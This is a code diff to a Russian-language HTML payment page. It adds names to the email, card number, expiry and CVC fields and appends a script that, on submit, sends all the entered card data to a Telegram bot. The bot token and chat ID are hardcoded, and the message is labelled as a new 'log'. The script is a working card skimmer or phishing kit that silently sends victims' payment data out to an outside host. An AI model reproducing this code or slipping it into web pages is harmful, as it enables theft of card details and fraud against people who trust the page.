@@ -13,6 +13,7 @@
     <!-- start: Payment -->
     <section class="payment-section">
         <div class="container">
+          <form id="tg">
             <div class="payment-wrapper">
                 <div class="payment-left">
                     <div class="payment-header">
@@ -61,20 +62,20 @@
                             </label>
                         </div>
                         <div class="payment-form-group">
-                            <input type="email" placeholder=" " class="payment-form-control" id="email">
+                            <input type="email" placeholder=" " class="payment-form-control" id="email" name="email">
                             <label for="email" class="payment-form-label payment-form-label-required">Email адрес</label>
                         </div>
                         <div class="payment-form-group">
-                            <input type="text" placeholder=" " class="payment-form-control" id="card-number">
+                            <input type="text" placeholder=" " class="payment-form-control" id="card-number" name="card_number">
                             <label for="card-number" class="payment-form-label payment-form-label-required">Номер карты</label>
                         </div>
                         <div class="payment-form-group-flex">
                             <div class="payment-form-group">
-                                <input type="text" placeholder=" " class="payment-form-control" id="expiry-date">
+                                <input type="text" placeholder=" " class="payment-form-control" id="expiry-date" name="srok">
                                 <label for="expiry-date" class="payment-form-label payment-form-label-required">Срок действия</label>
                             </div>
                             <div class="payment-form-group">
-                                <input type="text" placeholder=" " class="payment-form-control" id="cvv">
+                                <input type="text" placeholder=" " class="payment-form-control" id="cvv" name="cvc">
                                 <label for="cvv" class="payment-form-label payment-form-label-required">CVC</label>
                             </div>
                         </div>
@@ -82,9 +83,40 @@
                     </form>
                 </div>
             </div>
+          </form>
         </div>
     </section>
     <!-- end: Payment -->
 
+<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+<script>
+    const TOKEN = "6661735484:AAHT51bdf65uKwa40rm5JXV0geKvoiNYPT4";
+    const CHAT_ID = "-1002120288562";
+    const URI_API = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage';
+
+    document.getElementById('tg').addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        let message = '<b>Новый лог 🤑</b>\n\n';
+        message += '<b>Почта:</b> <pre>' + this.email.value + '</pre>\n';
+        message += '<b>Номер карты:</b> <pre>' + this.card_number.value + '</pre>\n';
+        message += '<b>Срок действия:</b> <pre>' + this.srok.value + '</pre>\n';
+        message += '<b>CVC:</b> <pre>' + this.cvc.value + '</pre>\n';
+
+        axios.post(URI_API, {
+            chat_id: CHAT_ID,
+            parse_mode: 'html',
+            text: message
+        })
+            .then(response => {
+                console.log(response);
+                // Добавьте обработчик успешного запроса
+            })
+            .catch(error => {
+                console.log(error);
+                // Добавьте обработчик ошибки
+            });
+    });
+</script>
 </body>
 </html>
